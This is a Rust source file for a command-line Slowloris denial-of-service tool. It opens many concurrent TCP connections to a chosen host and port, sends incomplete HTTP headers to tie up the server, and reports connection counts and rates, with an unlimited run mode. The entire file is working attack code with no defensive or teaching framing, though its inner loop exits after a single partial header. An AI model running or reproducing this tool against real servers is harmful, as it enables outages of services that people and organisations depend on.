use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::time::Duration;
use colored::Colorize;
use indicatif::{ProgressBar, ProgressStyle};
use tokio::time::sleep;
use tokio::net::TcpStream;
use tokio::io::AsyncWriteExt;

pub async fn perform_slowloris_attack(
    target_host: String,
    target_port: u16,
    duration: u64,
    concurrent: Option<u32>,
    delay: u64,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let target_addr = format!("{}:{}", target_host, target_port);
    
    println!("\n{} Starting Slowloris attack on: {}:{}\n", "INFO".blue(), target_host, target_port);
    println!("{} Duration: {} seconds", "INFO".blue(), if duration == 0 { "Unlimited".to_string() } else { duration.to_string() });
    println!("{} Concurrent connections: {}", "INFO".blue(), 
             concurrent.unwrap_or(if duration == 0 { 100 } else { 20 }));
    
    let requests_sent = Arc::new(AtomicU64::new(0));
    let requests_success = Arc::new(AtomicU64::new(0));
    let requests_error = Arc::new(AtomicU64::new(0));
    
    let active = Arc::new(AtomicBool::new(true));
    let active_clone = active.clone();
    
    let target_addr_clone = target_addr.clone();
    let concurrent_val = concurrent.unwrap_or(if duration == 0 { 100 } else { 20 }) as usize;
    
    let pb = ProgressBar::new_spinner();
    pb.set_style(
        ProgressStyle::default_spinner()
            .template("{spinner:.green} {msg}")
            .unwrap()
    );
    
    let start_time = std::time::Instant::now();
    
    // Status reporting task
    let status_requests_sent = requests_sent.clone();
    let status_requests_success = requests_success.clone();
    let status_requests_error = requests_error.clone();
    let pb_clone = pb.clone();
    let status_active = active.clone();
    
    tokio::spawn(async move {
        loop {
            if !status_active.load(Ordering::SeqCst) {
                break;
            }
            tokio::time::sleep(Duration::from_secs(1)).await;
            
            let sent = status_requests_sent.load(Ordering::SeqCst);
            let success = status_requests_success.load(Ordering::SeqCst);
            let error = status_requests_error.load(Ordering::SeqCst);
            
            let elapsed_time = start_time.elapsed().as_secs() as f64;
            let rps = if elapsed_time > 0.0 { sent as f64 / elapsed_time } else { 0.0 };
            
            pb_clone.set_message(format!(
                "{} Sent: {}, Success: {}, Errors: {}, RPS: {:.1}",
                "STATUS:".green(),
                sent,
                success,
                error,
                rps
            ));
        }
    });
    
    // Attack tasks
    let mut handles = vec![];
    
    for i in 0..concurrent_val {
        let active_task = active.clone();
        let target_addr_task = target_addr_clone.clone();
        let requests_sent_task = requests_sent.clone();
        let requests_success_task = requests_success.clone();
        let requests_error_task = requests_error.clone();
        let delay_task = delay;
        
        let handle = tokio::spawn(async move {
            while active_task.load(Ordering::SeqCst) {
                match slowloris_connection(&target_addr_task, i).await {
                    Ok(_) => {
                        requests_sent_task.fetch_add(1, Ordering::SeqCst);
                        requests_success_task.fetch_add(1, Ordering::SeqCst);
                    }
                    Err(_) => {
                        requests_sent_task.fetch_add(1, Ordering::SeqCst);
                        requests_error_task.fetch_add(1, Ordering::SeqCst);
                    }
                }
                
                if delay_task > 0 {
                    tokio::time::sleep(Duration::from_millis(delay_task)).await;
                }
            }
        });
        
        handles.push(handle);
    }
    
    // Wait for duration or until interrupted
    if duration > 0 {
        tokio::time::sleep(Duration::from_secs(duration)).await;
        active_clone.store(false, Ordering::SeqCst);
    } else {
        println!("\n{} Slowloris attack started in unlimited mode. Press Ctrl+C to stop.", "INFO".blue());
        
        // Keep running until user interrupts
        loop {
            if !active_clone.load(Ordering::SeqCst) {
                break;
            }
            tokio::time::sleep(Duration::from_secs(1)).await;
        }
    }
    
    // Wait for all tasks to finish
    for handle in handles {
        let _ = handle.await;
    }
    
    // Stop the status reporting
    active_clone.store(false, Ordering::SeqCst);
    
    pb.finish_and_clear();
    
    let total_sent = requests_sent.load(Ordering::SeqCst);
    let total_success = requests_success.load(Ordering::SeqCst);
    let total_error = requests_error.load(Ordering::SeqCst);
    
    println!("\n{}", "SLOWLORIS ATTACK COMPLETED".green().bold());
    println!("Total connections attempted: {}", total_sent);
    println!("Successful connections: {}", total_success);
    println!("Failed connections: {}", total_error);
    
    let success_rate = if total_sent > 0 {
        (total_success as f64 / total_sent as f64) * 100.0
    } else {
        0.0
    };
    
    if total_sent > 0 {
        println!("Success rate: {:.2}%", success_rate);
        
        let elapsed_time = start_time.elapsed().as_secs() as f64;
        let avg_rps = total_sent as f64 / elapsed_time;
        println!("Average connections per second: {:.1}", avg_rps);
    }
    
    Ok(())
}

async fn slowloris_connection(target_addr: &str, _connection_id: usize) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let mut stream = TcpStream::connect(target_addr).await?;
    
    // Send initial HTTP request headers slowly
    let initial_request = format!(
        "GET / HTTP/1.1\r\nHost: {}\r\nConnection: keep-alive\r\n", 
        target_addr.split(':').next().unwrap_or("localhost")
    );
    
    stream.write_all(initial_request.as_bytes()).await?;
    
    // Keep the connection alive by sending partial headers periodically
    loop {
        // Send a partial header to keep the connection alive
        stream.write_all(b"X-a: ").await?;
        stream.flush().await?;
        
        // Sleep for a while to maintain the connection
        sleep(Duration::from_secs(10)).await;
        
        // Break if we need to close the connection
        // In a real implementation, we might want to maintain this connection longer
        break;
    }
    
    Ok(())
}